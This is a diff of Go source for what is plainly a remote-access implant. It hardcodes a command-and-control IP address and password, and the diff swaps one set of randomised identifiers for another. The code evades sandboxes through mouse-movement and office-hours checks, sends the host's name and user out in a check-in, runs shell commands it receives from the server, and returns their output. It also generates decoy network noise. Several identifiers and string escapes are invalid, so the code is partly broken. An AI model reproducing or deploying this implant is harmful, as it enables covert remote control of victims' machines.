@@ -19,10 +19,10 @@ import (
 )
 
 const (
-	SERVER_URL = "https://37.27.249.191:7443"
-	SERVER_PWD = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
-	USER_AGENT_STR = "PLACEHOLDER_USER_AGENT"
-	MUTEX_STR = "PLACEHOLDER_MUTEX"
+	SERVER_URL     = "https://37.27.249.191:7443"
+	SERVER_PWD     = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
+	USER_AGENT_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+	MUTEX_STR      = "Global\ServiceHostPdsUXaZbEYEsQqHlr"
 )
 
 var (
@@ -35,7 +35,7 @@ var (
 	pGetSystemMetrics  = u32.NewProc("GetSystemMetrics")
 )
 
-type 62LdNcyiptOH struct {
+type PaIwfDDJMlXZd struct {
 	Action    string                 `json:"action"`
 	UUID      string                 `json:"uuid"`
 	User      string                 `json:"user"`
@@ -47,7 +47,7 @@ type 62LdNcyiptOH struct {
 	Payload   map[string]interface{} `json:"payload_os"`
 }
 
-type RhlyB5l57X struct {
+type PyFadqjhmrD struct {
 	Action     string `json:"action"`
 	TaskID     string `json:"task_id"`
 	UserOutput string `json:"user_output"`
@@ -58,7 +58,7 @@ type Point struct {
 	X, Y int32
 }
 
-func zyJdEyaPSEs83iN1() bool {
+func PIlhYOusgpnaIorMh() bool {
 	if runtime.GOOS != "windows" {
 		return false
 	}
@@ -103,7 +103,7 @@ func zyJdEyaPSEs83iN1() bool {
 	return false
 }
 
-func 6GsMuAfr5ECQKsE5N2() bool {
+func PPrIigAVIJAHNihUWaZ() bool {
 	var pos1, pos2 Point
 	
 	pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
@@ -120,7 +120,7 @@ func 6GsMuAfr5ECQKsE5N2() bool {
 	return true
 }
 
-func A352nBGFbLCDgYDZlP5m() bool {
+func PqWpvcMnkbWthVmlxvTOx() bool {
 	now := time.Now()
 	hour := now.Hour()
 	weekday := now.Weekday()
@@ -132,11 +132,11 @@ func A352nBGFbLCDgYDZlP5m() bool {
 	return hour >= 9 && hour <= 17
 }
 
-func zS4yRG46epFxEQ() error {
+func PxrTUxjYvnFoXki() error {
 	hostname, _ := os.Hostname()
 	uuid := fmt.Sprintf("%d-%s", time.Now().Unix(), hostname)
 	
-	payload := 62LdNcyiptOH{
+	payload := PaIwfDDJMlXZd{
 		Action:    "checkin",
 		UUID:      uuid,
 		User:      os.Getenv("USERNAME"),
@@ -181,7 +181,7 @@ func zS4yRG46epFxEQ() error {
 	return nil
 }
 
-func 2e2uUrAdtWqgzFLo() ([]map[string]interface{}, error) {
+func PtcTHBwRfRbDDrNGO() ([]map[string]interface{}, error) {
 	client := &http.Client{
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
@@ -214,7 +214,7 @@ func 2e2uUrAdtWqgzFLo() ([]map[string]interface{}, error) {
 	return tasks, nil
 }
 
-func bRKbH3nZCnFmw99DcT(command string) string {
+func PMRnskUnKvMeNVufzCq(command string) string {
 	var cmd *exec.Cmd
 	
 	if runtime.GOOS == "windows" {
@@ -232,8 +232,8 @@ func bRKbH3nZCnFmw99DcT(command string) string {
 	return string(output)
 }
 
-func AQ4apY7nyNUc6fnayfZP(taskID, output string) error {
-	response := RhlyB5l57X{
+func PCkKZeqbiOrMuBFhozaVc(taskID, output string) error {
+	response := PyFadqjhmrD{
 		Action:     "post_response",
 		TaskID:     taskID,
 		UserOutput: base64.StdEncoding.EncodeToString([]byte(output)),
@@ -270,7 +270,7 @@ func AQ4apY7nyNUc6fnayfZP(taskID, output string) error {
 	return nil
 }
 
-func zEt7HFRrzOSyRq1afePxEk() {
+func PXTJtUSnEHdwuSByZzlBiYk() {
 	go func() {
 		for {
 			sleepTime := time.Duration(300+time.Now().Unix()%600) * time.Second
@@ -280,7 +280,7 @@ func zEt7HFRrzOSyRq1afePxEk() {
 				func() { exec.Command("nslookup", "microsoft.com").Run() },
 				func() { exec.Command("ping", "-n", "1", "8.8.8.8").Run() },
 				func() {
-					if f, err := os.Create(os.TempDir() + "\\temp_" + strconv.Itoa(int(time.Now().Unix())) + ".tmp"); err == nil {
+					if f, err := os.Create(os.TempDir() + "\temp_" + strconv.Itoa(int(time.Now().Unix())) + ".tmp"); err == nil {
 						f.Write([]byte("temporary system data"))
 						f.Close()
 						time.Sleep(5 * time.Second)
@@ -297,18 +297,18 @@ func zEt7HFRrzOSyRq1afePxEk() {
 }
 
 func main() {
-	if zyJdEyaPSEs83iN1() {
+	if PIlhYOusgpnaIorMh() {
 		os.Exit(0)
 	}
 	
-	if !6GsMuAfr5ECQKsE5N2() {
+	if !PPrIigAVIJAHNihUWaZ() {
 		time.Sleep(10 * time.Second)
-		if !6GsMuAfr5ECQKsE5N2() {
+		if !PPrIigAVIJAHNihUWaZ() {
 			os.Exit(0)
 		}
 	}
 	
-	if !A352nBGFbLCDgYDZlP5m() {
+	if !PqWpvcMnkbWthVmlxvTOx() {
 		now := time.Now()
 		nextBusiness := now
 		
@@ -328,22 +328,22 @@ func main() {
 		os.Exit(0)
 	}
 	
-	zEt7HFRrzOSyRq1afePxEk()
+	PXTJtUSnEHdwuSByZzlBiYk()
 	
-	err := zS4yRG46epFxEQ()
+	err := PxrTUxjYvnFoXki()
 	if err != nil {
 		time.Sleep(60 * time.Second)
 		os.Exit(0)
 	}
 	
 	for {
-		tasks, err := 2e2uUrAdtWqgzFLo()
+		tasks, err := PtcTHBwRfRbDDrNGO()
 		if err == nil && len(tasks) > 0 {
 			for _, task := range tasks {
 				if taskID, ok := task["id"].(string); ok {
 					if command, ok := task["command"].(string); ok {
-						output := bRKbH3nZCnFmw99DcT(command)
-						AQ4apY7nyNUc6fnayfZP(taskID, output)
+						output := PMRnskUnKvMeNVufzCq(command)
+						PCkKZeqbiOrMuBFhozaVc(taskID, output)
 					}
 				}
 			}
